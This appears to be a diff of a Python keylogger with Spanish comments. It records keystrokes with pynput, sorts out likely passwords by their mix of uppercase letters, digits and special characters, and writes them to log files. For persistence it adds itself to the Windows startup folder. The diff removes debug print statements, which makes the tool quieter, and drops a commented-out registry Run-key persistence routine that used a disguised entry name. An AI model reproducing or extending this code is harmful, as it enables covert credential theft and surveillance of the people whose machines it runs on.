@@ -7,33 +7,12 @@ import platform
 from pynput.keyboard import Key, Listener
 from pynput.mouse import Listener as MouseListener
 from auto_start import add_to_startup_folder
-#
-# import winreg
-#
-#
-# def add_registry_persistence(executable_path):
-#     # Open the Run key for current user
-#     reg_key = winreg.CreateKey(
-#         winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
-#
-#     # Add our entry
-#     entry_name = "LegitimateServiceName"
-#     winreg.SetValueEx(reg_key, entry_name, 0, winreg.REG_SZ, executable_path)
-#
-#     print(f"Added registry entry: {entry_name}")
-#     winreg.CloseKey(reg_key)
-#
 
-# executable_path = "C:\\Path\\To\\Executable.exe"
-# add_registry_persistence(executable_path)
 system = platform.system()
 if system == "Windows":
     current_directory = os.getcwd()
-    print(f"Current working directory: {current_directory}")
     exe_name = os.path.basename(sys.argv[0])
     result = add_to_startup_folder(f"{current_directory}\\{exe_name}")
-    if result:
-        print(f"Successfully added to startup: {result}")
 
 
 # Lista de teclas especiales
@@ -42,13 +21,6 @@ special_caracters_list = [
     ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "{", "|", "}",
     "~"
 ]
-
-# [
-#     Key.alt, Key.ctrl, Key.shift, Key.esc, Key.enter, Key.space,
-#     Key.backspace, Key.caps_lock, Key.tab,
-#     Key.f1, Key.f2, Key.f3, Key.f4, Key.f5, Key.f6, Key.f7, Key.f8, Key.f9, Key.f10, Key.f11, Key.f12,
-#     Key.up, Key.down, Key.left, Key.right, Key.home, Key.end, Key.page_up, Key.page_down
-# ]
 
 logging_format = logging.Formatter('%(asctime)s:%(message)s')
 
@@ -76,8 +48,6 @@ handler_posible_passwords.setFormatter(logging_format)
 logger_posible_paswords.addHandler(handler_posible_passwords)
 
 current_word = ""
-# current_click_location = [0, 0]
-# last_click_location = [0, 0]
 has_special_character = False
 
 
@@ -90,12 +60,10 @@ def on_press(key):
         logger_characters.info(key.char)
         if key.char in special_caracters_list:
             has_special_character = True
-            print(f"Tecla especial: {key}")
 
     except AttributeError:
         if key in [Key.space, Key.enter, Key.tab]:
             if current_word.strip():
-                print(f"Palabra: {current_word}")
                 logger_words.info(current_word)
                 has_uppercase = any(c.isupper() for c in current_word)
                 has_number = any(c.isdigit() for c in current_word)
